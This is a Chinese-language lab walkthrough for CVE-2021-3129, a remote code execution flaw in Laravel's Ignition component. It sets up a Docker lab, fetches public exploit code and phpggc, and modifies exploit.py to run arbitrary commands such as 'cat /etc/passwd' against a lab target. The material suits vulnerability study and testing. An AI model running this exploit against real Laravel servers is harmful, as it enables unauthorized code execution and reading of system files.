漏洞类型：远程代码执行（RCE）


漏洞POC以及docker漏洞环境获取：

http://github.com/SNCKER/CVE-2021-3129

POC文件类型：python文件


漏洞EXP获取：

http://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP

EXP文件类型：python文件


漏洞说明：Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。它可以让你从面条一样杂乱的代码中解脱出来；

它可以帮你构建一个完美的网络APP，而且每行代码都可以简洁、富于表达力。由于Laravel自带的lgnition组件对file_get_contents()

和file_put_contents()函数的不安全使用,攻击者可以通过发起恶意请求,构造恶意Log文件触发phar反序列,最终造成代码执行。


漏洞影响：Laravel <= 8.4.2Ignition <2.5.2


环境搭建


这里用到两台机器（一台机器也可）


1 攻击机:kali 2021.2


2 靶机:Centos7(ip:192.168.210.138)


Centos操作:


1 克隆github上已经搭建好的环境


git clone git://github.com/SNCKER/CVE-2021-3129

2 在克隆好的目录下进行执行以下命令启动环境

cd CVE-2021-3129
docker-compose up -d

3 在浏览器访问自己ip:8888端口   并且点击Generate app key即可


点击之后刷新页面



kali操作:


4 克隆环境的目录中附带exp,kali攻击机也可在github上进行下载

git clone git://github.com/SNCKER/CVE-2021-3129

进入克隆好的目录下


cd CVE-2021-3129


下载运行exp所使用的到的工具(与exp放同一目录下)

git clone git://github.com/ambionics/phpggc.git

给phpggc可执行权限 

chmod 777 ./phpggc/phpggc

5 使用vim修改exploit.py中的目标地址为Centos7地址(即目标地址)

vim exploit.py

修改main函数为

def main():
Exp("http://192.168.210.138:8888","cat /etc/passwd")

6 使用python3运行脚本开始攻击(从配置文件可以看出默认查看/etc/password文件,也可手动修改)

python3 exploit.py


7 修改一下exploit.py脚本就可以执行任意命令

vim exploit.py


在exploit文件开头添加import sys库


修改main函数

def main():
args=sys.argv
url=args[1]
command=args[2]
Exp(url,command)

8 运行脚本开始测试


第一个参数为目标ip,''中为执行的命令

python3 exploit.py http://192.168.210.138:8888 'whoami'
python3 exploit.py http://192.168.210.138:8888 'cat /etc/passwd'
